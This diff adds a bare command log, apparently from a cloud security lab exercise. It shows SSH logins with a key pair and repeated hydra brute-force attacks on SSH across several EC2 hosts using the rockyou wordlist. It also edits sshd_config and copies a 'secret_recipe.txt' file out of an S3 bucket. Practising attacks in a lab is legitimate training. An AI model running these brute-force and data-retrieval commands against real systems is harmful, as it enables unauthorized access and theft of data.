@@ -1,0 +1,34 @@
+chmod 400 ~/Downloads/mykeypair.pem 
+ssh -i ~/Downloads/mykeypair.pem ubuntu@ec2-3-84-0-38.compute-1.amazonaws.com
+hydra -l ubuntu -P rockyou.txt ssh://ec2-3-84-0-38.compute-1.amazonaws.com
+hydra -l ubuntu -P rockyou.txt -e ns ssh://ec2-3-84-0-38.compute-1.amazonaws.com
+
+hydra -l ubuntu -P rockyou.txt -t 32 ssh://ec2-3-84-0-38.compute-1.amazonaws.com
+
+ssh -i ~/Downloads/mykeypair.pem ubuntu@ec2-44-201-74-63.compute-1.amazonaws.com
+hydra -l ubuntu -P rockyou.txt ssh://ec2-44-201-74-63.compute-1.amazonaws.com
+
+nano /etc/ssh/sshd_config
+
+ec2-3-92-120-180.compute-1.amazonaws.com
+ssh -i ~/Downloads/mykeypair.pem ubuntu@ec2-3-92-120-180.compute-1.amazonaws.com
+hydra -l ubuntu -P rockyou.txt ssh://ec2-3-92-120-180.compute-1.amazonaws.com
+
+c1-web-service-alb-1331786207.us-east-1.elb.amazonaws.com
+hydra -l ubuntu -P rockyou.txt ssh://c1-web-service-alb-1331786207.us-east-1.elb.amazonaws.com
+ec2-3-92-120-180.compute-1.amazonaws.com
+hydra -l ubuntu -P rockyou.txt ssh://ec2-3-92-120-180.compute-1.amazonaws.com
+
+aws s3 ls  s3://cand-c3-secret-recipes-925429737025/ --region us-east-1
+
+aws s3 cp s3://cand-c3-secret-recipes-925429737025/secret_recipe.txt  .  --region us-east-1
+
+ec2-44-201-74-63.compute-1.amazonaws.com
+ssh -i ~/Downloads/mykeypair.pem ubuntu@ec2-44-201-74-63.compute-1.amazonaws.com
+
+ec2-3-92-120-180.compute-1.amazonaws.com
+hydra -l ubuntu -P rockyou.txt ssh://ec2-3-92-120-180.compute-1.amazonaws.com
+
+ec2-44-202-22-38.compute-1.amazonaws.com
+
+ssh -i ~/Downloads/mykeypair.pem ubuntu@ec2-44-202-22-38.compute-1.amazonaws.com
